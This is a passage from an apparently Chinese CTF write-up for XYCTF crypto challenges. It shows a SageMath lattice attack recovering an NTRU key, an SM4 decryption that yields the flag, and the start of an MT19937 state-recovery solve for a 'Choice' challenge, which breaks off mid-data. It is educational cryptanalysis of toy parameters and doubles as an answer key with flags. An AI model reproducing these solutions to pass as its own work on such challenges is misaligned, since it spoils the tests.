class="number">2</span>)</span><br><span class="line">    g = invert_polynomial_prime_modulus(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = center_polynomial_coefficients(compute_cyclic_convolution(g, f), q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = center_polynomial_coefficients(compute_cyclic_convolution(g, <span class="number">2</span> - r), q)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_polynomial</span>():</span><br><span class="line">    <span class="keyword">return</span> Zx([random.randint(-d, d) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    r = generate_random_polynomial()</span><br><span class="line">    <span class="keyword">return</span> center_polynomial_coefficients(</span><br><span class="line">        compute_cyclic_convolution(public_key, r) + message, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_ciphertext</span>(<span class="params">ciphertext, private_key, private_key_inverse</span>):</span><br><span class="line">    a = center_polynomial_coefficients(</span><br><span class="line">        compute_cyclic_convolution(private_key, ciphertext), q)</span><br><span class="line">    <span class="keyword">return</span> center_polynomial_coefficients(</span><br><span class="line">        compute_cyclic_convolution(private_key_inverse, a), p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perform_ntru_attack</span>(<span class="params">public_key</span>):</span><br><span class="line">    recip3 = lift(<span class="number">1</span>/Integers(q)(<span class="number">3</span>))</span><br><span class="line">    public_key_over_3 = center_polynomial_coefficients(recip3 * public_key, q)</span><br><span class="line">    M = matrix(<span class="number">2</span> * n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        M[i, i] = q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        M[i+n, i+n] = <span class="number">1</span></span><br><span class="line">        c = compute_cyclic_convolution(x**i, public_key_over_3)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            M[i+n, j] = c[j]</span><br><span class="line">    M = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> * n):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = Zx(<span class="built_in">list</span>(M[j][n:]))</span><br><span class="line">            f3 = invert_polynomial_prime_modulus(f, <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> (f, f3)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> (f, f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数设置</span></span><br><span class="line">n = <span class="number">49</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">128</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q &gt; (<span class="number">6</span>*d + <span class="number">1</span>)*p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥定义</span></span><br><span class="line">public_key = <span class="number">8</span>*x^<span class="number">48</span> + <span class="number">58</span>*x^<span class="number">47</span> + <span class="number">18</span>*x^<span class="number">46</span> + <span class="number">61</span>*x^<span class="number">45</span> + <span class="number">33</span>*x^<span class="number">44</span> + <span class="number">21</span>*x^<span class="number">43</span> + <span class="number">58</span>*x^<span class="number">42</span> + <span class="number">21</span>*x^<span class="number">41</span> + <span class="number">5</span>*x^<span class="number">40</span> + <span class="number">32</span>*x^<span class="number">39</span> + <span class="number">15</span>*x^<span class="number">38</span> + <span class="number">40</span>*x^<span class="number">37</span> + <span class="number">24</span>*x^<span class="number">36</span> + <span class="number">14</span>*x^<span class="number">35</span> + <span class="number">40</span>*x^<span class="number">34</span> + <span class="number">5</span>*x^<span class="number">33</span> + x^<span class="number">32</span> + <span class="number">48</span>*x^<span class="number">31</span> + <span class="number">21</span>*x^<span class="number">30</span> + <span class="number">36</span>*x^<span class="number">29</span> + <span class="number">42</span>*x^<span class="number">28</span> + <span class="number">8</span>*x^<span class="number">27</span> + <span class="number">17</span>*x^<span class="number">26</span> + <span class="number">54</span>*x^<span class="number">25</span> + <span class="number">39</span>*x^<span class="number">24</span> + <span class="number">38</span>*x^<span class="number">23</span> + <span class="number">14</span>*x^<span class="number">22</span> + <span class="number">22</span>*x^<span class="number">21</span> + <span class="number">26</span>*x^<span class="number">20</span> + <span class="number">22</span>*x^<span class="number">18</span> + <span class="number">7</span>*x^<span class="number">17</span> + <span class="number">29</span>*x^<span class="number">16</span> + <span class="number">53</span>*x^<span class="number">15</span> + <span class="number">50</span>*x^<span class="number">14</span> + <span class="number">49</span>*x^<span class="number">13</span> + <span class="number">21</span>*x^<span class="number">12</span> + <span class="number">47</span>*x^<span class="number">11</span> + <span class="number">50</span>*x^<span class="number">10</span> + <span class="number">32</span>*x^<span class="number">9</span> + <span class="number">14</span>*x^<span class="number">8</span> + <span class="number">50</span>*x^<span class="number">7</span> + <span class="number">18</span>*x^<span class="number">6</span> + <span class="number">9</span>*x^<span class="number">5</span> + <span class="number">61</span>*x^<span class="number">4</span> + <span class="number">10</span>*x^<span class="number">3</span> + <span class="number">9</span>*x^<span class="number">2</span> + <span class="number">11</span>*x + <span class="number">47</span></span><br><span class="line"><span class="comment"># 加密消息</span></span><br><span class="line">encrypted_message = <span class="number">31</span>*x^<span class="number">48</span> - <span class="number">14</span>*x^<span class="number">47</span> + x^<span class="number">46</span> + <span class="number">8</span>*x^<span class="number">45</span> - <span class="number">9</span>*x^<span class="number">44</span> - <span class="number">18</span>*x^<span class="number">43</span> - <span class="number">30</span>*x^<span class="number">41</span> + <span class="number">14</span>*x^<span class="number">40</span> + <span class="number">3</span>*x^<span class="number">39</span> - <span class="number">17</span>*x^<span class="number">38</span> + <span class="number">22</span>*x^<span class="number">37</span> + <span class="number">7</span>*x^<span class="number">36</span> + <span class="number">31</span>*x^<span class="number">34</span> - <span class="number">30</span>*x^<span class="number">33</span> - <span class="number">22</span>*x^<span class="number">32</span> - <span class="number">25</span>*x^<span class="number">31</span> + <span class="number">31</span>*x^<span class="number">30</span> - <span class="number">28</span>*x^<span class="number">29</span> + <span class="number">7</span>*x^<span class="number">28</span> + <span class="number">23</span>*x^<span class="number">27</span> - <span class="number">6</span>*x^<span class="number">26</span> + <span class="number">12</span>*x^<span class="number">25</span> - <span class="number">6</span>*x^<span class="number">24</span> + <span class="number">5</span>*x^<span class="number">23</span> - <span class="number">13</span>*x^<span class="number">22</span> - <span class="number">10</span>*x^<span class="number">20</span> + <span class="number">4</span>*x^<span class="number">19</span> + <span class="number">15</span>*x^<span class="number">18</span> + <span class="number">23</span>*x^<span class="number">17</span> + <span class="number">24</span>*x^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">15</span> - <span class="number">8</span>*x^<span class="number">14</span> - <span class="number">20</span>*x^<span class="number">13</span> + <span class="number">24</span>*x^<span class="number">12</span> - <span class="number">23</span>*x^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">10</span> - <span class="number">26</span>*x^<span class="number">9</span> - <span class="number">14</span>*x^<span class="number">8</span> + <span class="number">10</span>*x^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">5</span> - <span class="number">32</span>*x^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">31</span>*x^<span class="number">2</span> + <span class="number">16</span>*x + <span class="number">11</span></span><br><span class="line"><span class="comment"># 攻击并解密</span></span><br><span class="line">recovered_keys = perform_ntru_attack(public_key)</span><br><span class="line">decrypted_message = decrypt_ciphertext(encrypted_message, recovered_keys[<span class="number">0</span>], recovered_keys[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(decrypted_message)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为是多项式，所以一些像求逆这种运算需要重新定义一下。</p>
<p>然后正常sm4解密就行</p>
<p>这里加密代码好像有点问题，在sm4_key &#x3D; binascii.unhexlify(poly_terms)之前应该还要调用一下gen_key()才能用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_polynomial_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read().strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:</span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poly_str = read_polynomial_from_file(<span class="string">&quot;123.txt&quot;</span>)</span><br><span class="line">poly_terms = terms(poly_str)</span><br><span class="line"><span class="built_in">print</span>(poly_terms)</span><br><span class="line">pol_terms=gen_key(poly_terms)</span><br><span class="line">sm4_key = binascii.unhexlify(pol_terms)</span><br><span class="line"><span class="built_in">print</span>(sm4_key)</span><br><span class="line">key=sm4_key.<span class="built_in">hex</span>().upper()</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;000000000000000000002B15203C0208&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>网站解一下</p>
<p><img src="https://ooo.0x0.ooo/2025/04/09/O0GcEs.png" alt="O0GcEs.png"></p>
<p>最后转一下就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;58594354467B43727970746F305F63616E5F6E30745F536F3176655F69747D01&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;XYCTF&#123;Crypto0_can_n0t_So1ve_it&#125;\x01&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="5-Choice"><a href="#5-Choice" class="headerlink" title="5,Choice"></a>5,Choice</h1><p>给了三个py文件，首先看给出的random.py,其中定义了choice函数如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_randbelow_with_getrandbits</span>(<span class="params">self, n</span>):</span><br><span class="line">    <span class="string">&quot;Return a random int in the range [0,n).  Defined for n &gt; 0.&quot;</span></span><br><span class="line"></span><br><span class="line">    getrandbits = self.getrandbits</span><br><span class="line">    k = n.bit_length() - <span class="number">1</span></span><br><span class="line">    r = getrandbits(k)  <span class="comment"># 0 &lt;= r &lt; 2**k</span></span><br><span class="line">    <span class="keyword">while</span> r &gt;= n:</span><br><span class="line">        r = getrandbits(k)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">self, seq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Choose a random element from a non-empty sequence.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># As an accommodation for NumPy, we don&#x27;t use &quot;if not seq&quot;</span></span><br><span class="line">    <span class="comment"># because bool(numpy.array()) raises a ValueError.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(seq):</span><br><span class="line">        <span class="keyword">raise</span> IndexError(<span class="string">&#x27;Cannot choose from an empty sequence&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> seq[self._randbelow(<span class="built_in">len</span>(seq))]</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>_randbelow</code> 方法确保生成的随机数在 <code>[0, len(test))</code> 范围内。由于 <code>test</code> 的长度是 256，<code>_randbelow(256)</code> 会生成一个 8 位的随机整数（因为 256 是 2^8），而且并不会进入while循环，因为 k &#x3D; n.bit_length() - 1，r &#x3D; getrandbits(k)所以r一定是小于len(test)的。</p>
<p>而题目给了我们2496*8&#x3D;19968个bit，所以还是MT19937，直接板子打就行。还有一点要注意的是此时我们的随机数随机的是数的位置而不是数本身，所以需要提取题目给出数据的位置去打MT。这里我们用.index去提取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage 10.6</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1, get data</span></span><br><span class="line">x,c=[],[]</span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">test = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)]</span><br><span class="line">cc = [<span class="number">224</span>, <span class="number">55</span>, <span class="number">218</span>, <span class="number">253</span>, <span class="number">150</span>, <span class="number">84</span>, <span class="number">208</span>, <span class="number">134</span>, <span class="number">18</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">54</span>, <span class="number">122</span>, <span class="number">193</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">80</span>, <span class="number">230</span>, <span class="number">21</span>, <span class="number">236</span>, <span class="number">33</span>, <span class="number">226</span>, <span class="number">3</span>, <span class="number">120</span>, <span class="number">141</span>, <span class="number">212</span>, <span class="number">33</span>, <span class="number">69</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">64</span>, <span class="number">197</span>, <span class="number">10</span>, <span class="number">224</span>, <span class="number">64</span>, <span class="number">191</span>, <span class="number">17</span>, <span class="number">112</span>, <span class="number">196</span>, <span class="number">143</span>, <span class="number">209</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">198</span>, <span class="number">174</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">118</span>, <span class="number">175</span>, <span class="number">145</span>, <span class="number">111</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">206</span>, <span class="number">137</span>, <span class="number">37</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">252</span>, <span class="number">84</span>, <span class="number">18</span>, <span class="number">145</span>, <span class="number">81</span>, <span class="number">124</span>, <span class="number">202</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">144</span>, <span class="number">200</span>, <span class="number">13</span>, <span class="number">230</span>, <span class="number">218</span>, <span class="number">208</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">101</span>, <span class="number">211</span>, <span class="number">114</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">190</span>, <span class="number">226</span>, <span class="number">62</span>, <span class="number">118</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">118</span>, <span class="number">245</span>, <span class="number">196</span>, <span class="number">4</span>, <span class="number">92</span>, <span class="number">251</span>, <span class="number">238</span>, <span class="number">142</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">113</span>, <span class="number">247</span>, <span class="number">171</span>, <span class="number">8</span>, <span class="number">138</span>, <span class="number">20</span>, <span class="number">169</span>, <span class="number">192</span>, <span class="number">221</span>, <span class="number">223</span>, <span class="number">60</span>, <span class="number">56</span>, <span class="number">188</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">202</span>, <span class="number">195</span>, <span class="number">246</span>, <span class="number">71</span>, <span class="number">235</span>, <span class="number">152</span>, <span class="number">255</span>, <span class="number">73</span>, <span class="number">128</span>, <span class="number">140</span>, <span class="number">159</span>, <span class="number">119</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">223</span>, <span class="number">239</span>, <span class="number">242</span>, <span class="number">60</span>, <span class="number">228</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">210</span>, <span class="number">5</span>, <span class="number">165</span>, <span class="number">35</span>, <span class="number">176</span>, <span class="number">75</span>, <span class="number">21</span>, <span class="number">182</span>, <span class="number">220</span>, <span class="number">212</span>, <span class="number">240</span>, <span class="number">212</span>, <span class="number">77</span>, <span class="number">124</span>, <span class="number">52</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">200</span>, <span class="number">207</span>, <span class="number">31</span>, <span class="number">177</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">128</span>, <span class="number">124</span>, <span class="number">205</span>, <span class="number">216</span>, <span class="number">252</span>, <span class="number">34</span>, <span class="number">27</span>, <span class="number">198</span>, <span class="number">186</span>, <span class="number">61</span>, <span class="number">161</span>, <span class="number">192</span>, <span class="number">158</span>, <span class="number">226</span>, <span class="number">40</span>, <span class="number">127</span>, <span class="number">69</span>, <span class="number">162</span>, <span class="number">24</span>, <span class="number">46</span>, <span class="number">208</span>, <span class="number">183</span>, <span class="number">99</span>, <span class="number">165</span>, <span class="number">1</span>, <span class="number">221</span>, <span class="number">184</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">136</span>, <span class="number">236</span>, <span class="number">245</span>, <span class="number">228</span>, <span class="number">197</span>, <span class="number">86</span>, <span class="number">15</span>, <span class="number">201</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">18</span>, <span class="number">131</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">200</span>, <span class="number">192</span>, <span class="number">244</span>, <span class="number">205</span>, <span class="number">229</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">170</span>, <span class="number">5</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">33</span>, <span class="number">214</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">105</span>, <span class="number">233</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">84</span>, <span class="number">39</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">236</span>, <span class="number">104</span>, <span class="number">225</span>, <span class="number">196</span>, <span class="number">181</span>, <span class="number">105</span>, <span class="number">180</span>, <span class="number">159</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">201</span>, <span class="number">212</span>, <span class="number">175</span>, <span class="number">203</span>, <span class="number">200</span>, <span class="number">19</span>, <span class="number">99</span>, <span class="number">24</span>, <span class="number">112</span>, <span class="number">180</span>, <span class="number">75</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">204</span>, <span class="number">13</span>, <span class="number">210</span>, <span class="number">165</span>, <span class="number">135</span>, <span class="number">175</span>, <span class="number">132</span>, <span class="number">205</span>, <span class="number">247</span>, <span class="number">28</span>, <span class="number">178</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">196</span>, <span class="number">240</span>, <span class="number">121</span>, <span class="number">132</span>, <span class="number">21</span>, <span class="number">8</span>, <span class="number">45</span>, <span class="number">203</span>, <span class="number">143</span>, <span class="number">206</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">47</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">35</span>, <span class="number">63</span>, <span class="number">168</span>, <span class="number">251</span>, <span class="number">11</span>, <span class="number">254</span>, <span class="number">11</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">184</span>, <span class="number">114</span>, <span class="number">88</span>, <span class="number">194</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">44</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">42</span>, <span class="number">234</span>, <span class="number">112</span>, <span class="number">100</span>, <span class="number">248</span>, <span class="number">247</span>, <span class="number">66</span>, <span class="number">221</span>, <span class="number">72</span>, <span class="number">229</span>, <span class="number">236</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">203</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">23</span>, <span class="number">181</span>, <span class="number">190</span>, <span class="number">87</span>, <span class="number">1</span>, <span class="number">76</span>, <span class="number">113</span>, <span class="number">48</span>, <span class="number">178</span>, <span class="number">42</span>, <span class="number">175</span>, <span class="number">49</span>, <span class="number">78</span>, <span class="number">159</span>, <span class="number">104</span>, <span class="number">229</span>, <span class="number">213</span>, <span class="number">223</span>, <span class="number">13</span>, <span class="number">249</span>, <span class="number">216</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">203</span>, <span class="number">156</span>, <span class="number">23</span>, <span class="number">129</span>, <span class="number">148</span>, <span class="number">87</span>, <span class="number">37</span>, <span class="number">79</span>, <span class="number">227</span>, <span class="number">141</span>, <span class="number">202</span>, <span class="number">210</span>, <span class="number">245</span>, <span class="number">236</span>, <span class="number">121</span>, <span class="number">129</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">121</span>, <span class="number">42</span>, <span class="number">82</span>, <span class="number">184</span>, <span class="number">222</span>, <span class="number">96</span>, <span class="number">100</span>, <span class="number">189</span>, <span class="number">62</span>, <span class="number">102</span>, <span class="number">176</span>, <span class="number">198</span>, <span class="number">1</span>, <span class="number">153</span>, <span class="number">242</span>, <span class="number">23</span>, <span class="number">191</span>, <span class="number">197</span>, <span class="number">176</span>, <span class="number">115</span>, <span class="number">206</span>, <span class="number">122</span>, <span class="number">50</span>, <span class="number">104</span>, <span class="number">70</span>, <span class="number">170</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">187</span>, <span class="number">201</span>, <span class="number">78</span>, <span class="number">25</span>, <span class="number">75</span>, <span class="number">126</span>, <span class="number">118</span>, <span class="number">160</span>, <span class="number">250</span>, <span class="number">53</span>, <span class="number">112</span>, <span class="number">143</span>, <span class="number">161</span>, <span class="number">251</span>, <span class="number">221</span>, <span class="number">44</span>, <span class="number">255</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">31</span>, <span class="number">217</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">236</span>, <span class="number">21</span>, <span class="number">160</span>, <span class="number">127</span>, <span class="number">9</span>, <span class="number">220</span>, <span class="number">22</span>, <span class="number">97</span>, <span class="number">159</span>, <span class="number">239</span>, <span class="number">25</span>, <span class="number">140</span>, <span class="number">206</span>, <span class="number">210</span>, <span class="number">148</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">41</span>, <span class="number">56</span>, <span class="number">92</span>, <span class="number">141</span>, <span class="number">3</span>, <span class="number">200</span>, <span class="number">165</span>, <span class="number">14</span>, <span class="number">161</span>, <span class="number">219</span>, <span class="number">177</span>, <span class="number">40</span>, <span class="number">189</span>, <span class="number">75</span>, <span class="number">48</span>, <span class="number">146</span>, <span class="number">130</span>, <span class="number">151</span>, <span class="number">100</span>, <span class="number">144</span>, <span class="number">239</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">246</span>, <span class="number">166</span>, <span class="number">231</span>, <span class="number">228</span>, <span class="number">68</span>, <span class="number">254</span>, <span class="number">16</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">32</span>, <span class="number">177</span>, <span class="number">216</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">211</span>, <span class="number">100</span>, <span class="number">142</span>, <span class="number">251</span>, <span class="number">16</span>, <span class="number">64</span>, <span class="number">83</span>, <span class="number">161</span>, <span class="number">184</span>, <span class="number">242</span>, <span class="number">248</span>, <span class="number">239</span>, <span class="number">141</span>, <span class="number">171</span>, <span class="number">135</span>, <span class="number">48</span>, <span class="number">20</span>, <span class="number">34</span>, <span class="number">250</span>, <span class="number">13</span>, <span class="number">70</span>, <span class="number">236</span>, <span class="number">172</span>, <span class="number">22</span>, <span class="number">241</span>, <span class="number">171</span>, <span class="number">25</span>, <span class="number">18</span>, <span class="number">204</span>, <span class="number">36</span>, <span 